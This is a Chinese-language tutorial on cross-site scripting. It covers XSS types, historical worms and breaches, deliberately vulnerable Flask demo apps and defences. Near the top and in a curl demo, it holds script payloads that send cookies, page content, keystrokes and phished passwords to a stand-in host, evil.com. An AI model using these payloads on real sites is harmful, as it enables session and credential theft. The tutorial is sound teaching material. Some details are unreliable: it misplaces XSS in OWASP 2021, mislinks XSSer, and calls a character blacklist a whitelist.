# XSS 跨站脚本（Cross-Site Scripting）

> **一句话定义**：攻击者将恶意脚本注入到网页中，当其他用户访问该页面时，脚本在用户的浏览器中执行。

**危险等级**：🟡 高危
**OWASP Top 10 2021**：A07 — XSS（第 7 位，与 Identification and Authentication Failures 合并）

---

## 原理深度分析

### 为什么发生

XSS 的根本原因是**将不可信的用户输入直接输出到 HTML 页面中，而没有进行适当的转义**。

浏览器分不清哪些是开发者写的安全代码，哪些是攻击者注入的恶意代码——只要出现在 HTML 中，它就会执行。

### 三种类型

| 类型 | 描述 | 持久性 | 危险度 |
|------|------|--------|--------|
| **反射型** | 恶意脚本在 URL 参数中，服务器反射回页面 | 一次性 | ⭐⭐⭐ |
| **存储型** | 恶意脚本存储在服务器（数据库、评论等） | 持久 | ⭐⭐⭐⭐⭐ |
| **DOM 型** | 恶意脚本通过客户端 JavaScript 修改 DOM 触发 | 一次性/持久 | ⭐⭐⭐⭐ |

### 攻击能做什么

```javascript
// 窃取 cookie
<script>document.location='https://evil.com/steal?c='+document.cookie</script>

// 窃取页面内容
<script>fetch('https://evil.com/steal?html='+btoa(document.body.innerHTML))</script>

// 按键记录
<script>
document.addEventListener('keydown', function(e) {
    fetch('https://evil.com/key?k='+e.key);
});
</script>

// 钓鱼 — 伪装登录框
<script>
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%">' +
    '<h2>会话已过期，请重新登录</h2>' +
    '<input placeholder="用户名"><input type="password" placeholder="密码">' +
    '<button onclick="fetch(`https://evil.com/cred?u=${...}`)">登录</button></div>';
</script>
```

---

## 真实世界案例

### 案例 1：Twitter XSS 蠕虫（2010）

一个名为「鼠键蠕虫」（Mouseover Worm）的存储型 XSS 攻击席卷 Twitter。

- **攻击方式**：攻击者在推文中嵌入 JavaScript
- **传播**：当用户鼠标悬停在恶意推文上时，脚本自动执行，发布新的恶意推文
- **影响**：数小时内数十万用户受影响
- **教训**：Twitter 当时没有对推文内容进行任何转义

### 案例 2：British Airways XSS 数据泄露（2018）

英国航空网站被注入 XSS 脚本，窃取 **38 万**笔支付信息。

- **攻击方式**：攻击者通过 XSS 修改付款页面
- **后果**：英国航空被罚款 **2,300 万**欧元（GDPR 处罚）
- **教训**：即使是大型企业，XSS 也能造成灾难性后果

### 案例 3：MySpace Samy 蠕虫（2005）

史上传播最快的 XSS 蠕虫，在 20 小时内添加了 **100 万**好友。

- **攻击方式**：Samy Kamkar 在 MySpace 个人资料中注入 XSS
- **传播**：每个访问者被脚本添加为好友，并在其个人资料中复制恶意代码
- **后果**：MySpace 被迫关闭维护

---

## 简单 POC

### 靶场代码（反射型 XSS）

```python
# app.py — 有 XSS 漏洞的搜索页面
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # 🔴 漏洞：直接将用户输入拼接到 HTML 中
    return f"""
    <html>
    <head><title>搜索</title></head>
    <body>
        <h1>搜索</h1>
        <p>你搜索了：{query}</p>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(port=5001)
```

### 攻击演示

```bash
# 正常使用
curl "http://localhost:5001/search?q=hello"
# 页面显示：你搜索了：hello

# 反射型 XSS — 弹出对话框
curl "http://localhost:5001/search?q=<script>alert('XSS')</script>"
# 浏览器执行了 alert

# 窃取 Cookie
curl "http://localhost:5001/search?q=<script>new Image().src='https://evil.com/steal?c='%2Bdocument.cookie</script>"
```

### 存储型 XSS 演示

```python
# app.py — 有存储型 XSS 漏洞的评论区
from flask import Flask, request
import sqlite3

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('comments.db')
    conn.execute("CREATE TABLE IF NOT EXISTS comments (content text)")
    conn.commit()
    conn.close()

@app.route('/comment', methods=['POST'])
def add_comment():
    content = request.form.get('content', '')
    # 🔴 漏洞：直接存储未转义的 HTML
    conn = sqlite3.connect('comments.db')
    conn.execute("INSERT INTO comments VALUES (?)", (content,))
    conn.commit()
    conn.close()
    return "评论已提交"

@app.route('/comments')
def show_comments():
    conn = sqlite3.connect('comments.db')
    cursor = conn.execute("SELECT content FROM comments")
    comments = cursor.fetchall()
    conn.close()
    
    items = "".join([f"<div class='comment'>{c[0]}</div>" for c in comments])
    # 🔴 漏洞：直接渲染未转义的 HTML
    return f"<html><body><h1>评论</h1>{items}</body></html>"
```

```bash
# 攻击者提交恶意评论
curl -X POST "http://localhost:5001/comment" -d "content=<script>alert('存储型XSS')</script>"

# 每个访问 /comments 的用户都会触发脚本
```

---

## 修复方案

### 方案 1：上下文感知输出编码 ⭐⭐⭐⭐⭐

**核心原则：根据输出位置使用不同的编码方式。**

```python
from html import escape

# ✅ 修复：HTML 实体编码
@app.route('/search_fixed')
def search_fixed():
    query = request.args.get('q', '')
    # escape 将 < > " & ' 转换为 &lt; &gt; &quot; &amp; &#x27;
    safe_query = escape(query)
    return f"""
    <html>
    <body>
        <p>你搜索了：{safe_query}</p>
    </body>
    </html>
    """
```

**各语言/框架的安全输出方式：**

```python
# Python Flask — Jinja2 模板（默认自动转义）
from flask import render_template
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return render_template('search.html', q=query)

# 在 Jinja2 模板中：
# {{ q }} — 自动转义 ✅
# {{ q|safe }} — 关闭转义，仅在信任内容时使用 ❗
```

```javascript
// JavaScript — 不要用 innerHTML
// 🔴 危险
element.innerHTML = userInput;

// ✅ 安全
element.textContent = userInput;
element.innerText = userInput;
```

```java
// Java — 使用 OWASP Java Encoder
import org.owasp.encoder.Encode;

String safeHtml = Encode.forHtml(userInput);
String safeAttr = Encode.forHtmlAttribute(userInput);
String safeJs = Encode.forJavaScript(userInput);
String safeUrl = Encode.forUriComponent(userInput);
```

```php
// PHP
$safe = htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
```

### 方案 2：Content Security Policy（CSP）⭐⭐⭐⭐⭐

**CSP 是浏览器层面的 XSS 最后防线。**

```nginx
# Nginx 配置 CSP
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' https://cdn.trusted.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
    object-src 'none';
    base-uri 'none';
" always;
```

```python
# Flask 配置 CSP
@app.after_request
def add_csp(response):
    response.headers['Content-Security-Policy'] = \
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
    return response
```

### 方案 3：HttpOnly Cookie ⭐⭐⭐⭐

**防止 XSS 窃取会话 Cookie。**

```python
# Flask 设置 HttpOnly Cookie
from flask import make_response
resp = make_response("登录成功")
resp.set_cookie('session_id', 'abc123', httponly=True, secure=True, samesite='Strict')
return resp
```

> `httponly=True` 使 `document.cookie` 无法读取该 Cookie，XSS 无法窃取会话令牌。

### 方案 4：输入验证 ⭐⭐⭐

**白名单验证比黑名单更安全。**

```python
import re

def sanitize_input(user_input):
    # 白名单：只允许安全的文本
    return re.sub(r'[<>\'\"&]', '', user_input)
```

---

## 检测与防御工具

| 工具 | 类型 | 用途 |
|------|------|------|
| [XSSer](https://github.com/s0md3v/XSStrike) | 模糊测试 | 自动检测 XSS |
| [XSStrike](https://github.com/s0md3v/XSStrike) | 智能扫描 | 多向量 XSS 检测 |
| [DOMPurify](https://github.com/cure53/DOMPurify) | 客户端库 | 清理用户 HTML |
| [CSP Evaluator](https://csp-evaluator.withgoogle.com/) | 在线检查 | 评估 CSP 策略 |

```html
<!-- 在富文本编辑器中使用 DOMPurify -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
<script>
    const dirty = '<img onerror="alert(\'XSS\')" src=x>';
    const clean = DOMPurify.sanitize(dirty);
    console.log(clean);  // <img src="x">
</script>
```

---

## 延伸阅读

1. [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
2. [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
3. [CSP 规范](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
4. [Samy Kamkar — MySpace Worm 技术分析](https://samy.pl/myspace/tech.html)
5. [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
